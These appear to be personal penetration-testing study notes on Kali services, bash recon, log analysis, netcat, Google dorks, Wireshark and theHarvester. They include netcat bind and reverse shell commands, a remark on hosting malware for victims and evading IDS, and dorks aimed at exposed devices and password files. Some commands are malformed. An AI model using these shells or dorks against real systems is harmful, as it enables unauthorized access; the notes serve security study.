#-------------------------------s-s-h---------------------------------------------
Ssh-remote axe to pc>secure/encrypted protocol
--tcp based+listens on port 22
To start the srvc in kali:

	$ Service ssh start
	$ netstate -antp|grep sshd

Ssh start@boot > update-rc.d > enable/disable most srvcs in kali

	$ update-rc.d ssh enable 
#-------------------------h-t-t-p---------------------------------------------------
Http pro> host a site+platform to d.load malware on victm machine
--tcp based+listens on port 80
To start the http srvc in kali:

	$ service apache2 start
	$ netstat -antp|grep apache2
	$ update-rc.d apache2 enable

More granular control: rcconf OR sysvrc-conf (mng boot persistence of srvcs)
#-------------------------b-a-s-h-+-g-r-e-p-------------------------------------------------
Task1: get subdomains+ip of cisco(.)com
1)get index pg with wget
2)scan for domains
3)xtract lines tht contain links “href=”
4)xtract doms w/o a slash in field 3 append | cut “/” -f 3 
5)xtract doms w/o a period append | grep “\.”
6)clean it up to get rid of quote append | cut ‘“‘ -f 1
7)delete duplicates dedup append | sort -u
8)exlude anything leftover append | grep -v “path><path =d”

	$ wget cisco(.)com
	$ ls -l index.html
	$ grep “href=” index.html
	$ grep “href=” index.html | cut -d “/” -f 3
	$ grep “href=” index.html | cut -d “/” -f 3 | grep “\.”
	$ grep “href=” index.html | cut -d “/” -f 3 | grep “\.” | cut -d ‘“‘ -f 1
	$ grep “href=” index.html | cut -d “/” -f 3 | grep “\.” | cut -d ‘“‘ -f 1 | sort -u
	$ grep “href=” index.html | cut -d “/” -f 3 | grep “\.” | cut -d ‘“‘ -f 1 | grep -v “path” | sort -u


Clever way:cat file+grep with regex

	$ cat index.html | grep -o ‘https://[^”]*’ | cut -d “/” -f 3 | sort -u > domains.txt

Sources: Grep


host cmd to get ip of urls in domain.txt .:. bash loop

	$ for url in $(cat domains.txt); do host $url; done

1)host is busy;ip output into grep 

$ for url in $(cat domaints.txt); do host $url; done | grep “has address” | cut -d “ “ -f 4 | sort -u  

---=Task1Complete=---
$ Wget hxxps://www.cisco.com
$ Cat index.html | grep -o ‘https://[^”]*’ | cut -d “/” -f 3 | sort -u > domains.txt
$ for url in $(cat domains.txt); do host $url; done | grep “has address” | cut -d “ ” -f 4 | sort -u
------------------- 

Task2: inspect server log for attack via bash (apache http server)
1)head cmd to undrstnd the structure
2)wc -l cmd to “” + give us #sloc
3)cat output>cut+sort (clue for #of atkrs)
4)stats count #oftimes ip accessd the server(uniq+sort)
5)stats count (resources accessed) by ++frequent ip
6)closer look at the accessed request
	$ head access.log
	$ wc -l access.log
	$ cat access.log | cut -d “ “ -f 1 | sort -u
	$ cat access.log | cut -d “ “ -f 1 | uniq -c | sort -urn
	$ cat access.log | grep ‘75.97.9.59’ | cut -d “\” -f 2 | sort -u
	$ cat access.log | grep ‘75.97.9.59’ | grep ‘/admin ‘ | sort -u
	
xrcise: create bash script for a ping sweeep (find ip's)
---------note> can b detected by protocol loggers like ippl

nc/netcat - swissarmy knife (r/w to tcp/udp ports , cat for netwrk) + client/srvr modes
Use: 
a)cmd redirection+(from exe file; redirect in/output, error msg to TCP/UDP port)
b)check if port is open/closed + 
c)read a banner + 
d)conect to net srvc manually+
e)dbg net apps

Downfall: no auth+ncrypt in/out connections

	#--------------------------------------------------------------------------------------------------#
	#!Note!: ncat+sbd should be used, not netcat (create secure bind shells ~ssl enc + avd trippin IDS)#
	#--------------------------------------------------------------------------------------------------#
	
1)check to see if this port is open on a lab host
2)listen for connections on port 4444
3)cnct to that port from nix host
4)redirect incoming input into incoming.exe (win)
5)locate wget.exe on nix host 
6)push wget.exe to the win host
7)test if the file was sent by exe the file (no progress bar)
	$ nc -nv 192.168.0.1 110
	$ nc -nlvp 4444
	$ nc -nlvp 192.168.0.1 4444
	$ nc -nlvp 4444 > incoming.exe(win)
	$ locate wget.exe (lin)
	$ nc -nv 192.168.0.1 4444 < usr/share/windows-binaries/wget.exe

Break into targets network> gain shell>connect back to host machine/waiting for instructions from host/relying on incoming connections from external source
Nc bind shell: (needs win help)
	$ nc -nlvp 4444 -e cmd.exe (win bind port 4444 to cmd.exe)
	$ ifconfig eth0 | grep “inet” (*nix)
	$ nc -nv 10.0.0.2 4444 (*nix)

Break into targets network>gain shell>send victims shell back to host machine
Reverse shell:
$ nc -nv 4444 (*nix listen for incoming shell)
$ nc -nv 10.0.0.2 4444 > -e /bin/bash

Due: 
reverse shell from kali>win, vcvr
Bind shell from win>kali, vcvr




#----------------Ghdb:---------------------------------------------------------#
Site:microsoft.com -site:microsoft.com
Intitle:”netbotz appliance” “OK” -filetype:pdf
Intitle:”SpeedStream Router Management Interface”
inurl:”level/15/exec/-/show”
“# -FrontPage-” filetype:pwd inurl:(service | authors | administrators | users)”
#------------------------------------------------------------------------------#


#--------------------W-i-r-e-s-h-a-r-k-----------------------------------------#
Wshark uses libpcap (*nix), winpcap (win)
Capture+display filters;only c wat u need
network>cap.filter>cap.engine>disp.filter

Packet1: ARP br.cast looking for default gway
Packet2: ARP reply with MAC addr
Packet2: DNS A(ipv4) query for yahoo.ca
Packet4: DNS AAAA(ipv6) query “”.ca
Packet5: DNS A - response recieved
Packet6: DNS AAAA - “”
Packet7-9: three way handshake 
Packet10: http - get request sent
------------------------------------------
Osint:
Engagement begins>what do they do?
public facing?
Sales dept?
Hiring? (contact info, fax, email, company structure, etc)
Clean html

#--------------h-a-r-v-e-s-t-e-r---------------------------------------------#
Email harvest:
theHarvester; gather uname,subdmains , hosts, employee names, open ports, banners,	
From: search engines, PGP servers, shodan pcdb


	$ sudo -sH #root+mod any file
	$ sudo apt-get subversion #d.l version control
	$ cd opt #change dir
	$ svn checkout hxxps://github.com/laramies/theHarvester
	$ ls #can see theHarvester in /opt
	$ python3 -m pip install pipenv
	$ pipenv install
	$ pipenv run python3 theHarvester.py -d cisco.com -b google.com >google.txt #try dif
										#data src(-b)

Note: update apikeys in api-keys.yaml
bing
github
hunter
intelx
securityTrails
shodan
Spyse

Search ngine comparison: search engine showdown
netcraft> find out web server info (os, uptime, -V)
spyse	




fkn awesome resources:
hxxps://niiconsulting.com/checkmate/2017/06/a-detail-guide-on-oscp-preparation-from-newbie-to-oscp/
hxxps://highon.coffee/blog/reverse-shell-cheat-sheet/
hxxps://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
hxxps://jordanpotti.com/oscp/
hxxps://overthewire.org/wargames/bandit/bandit1.html
hxxp://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
hxxps://github.com/danielmiessler/SecLists
hxxps://github.com/cmoras/linux-exploit-suggester
hxxps://github.com/FuzzySecurity/PowerShell-Suite
hxxps://herrfeder.github.io/pentesting/2018/09/30/OSCP-Cheat-Sheet.html#msfvenom-payloads !!!!
